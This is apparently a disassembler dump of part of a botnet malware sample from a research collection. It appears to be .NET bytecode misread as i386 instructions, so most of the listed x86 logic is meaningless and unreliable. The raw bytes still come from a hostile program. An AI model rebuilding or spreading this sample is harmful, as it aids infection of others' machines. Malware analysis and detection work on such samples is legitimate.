
malware_samples/botnet/76204ee3fe474906b8b47dc349bc44041ee68fc524d746a26e11350a7e432988.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	20 c7                	and    %al,%bh
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 fc 59 00    	add    %al,0x59fc00
  402013:	00 f4                	add    %dh,%ah
  402015:	6c                   	insb   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	9a 25 00 70 7e 10 00 	lcall  $0x10,$0x7e700025
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 4e 21 00       	and    $0x214e72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 46                	jb     0x40223c
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 4e 21 00       	and    $0x214e72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 58                	jb     0x40227e
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 58 26 00       	and    $0x265872,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 48             	add    %dh,0x48(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
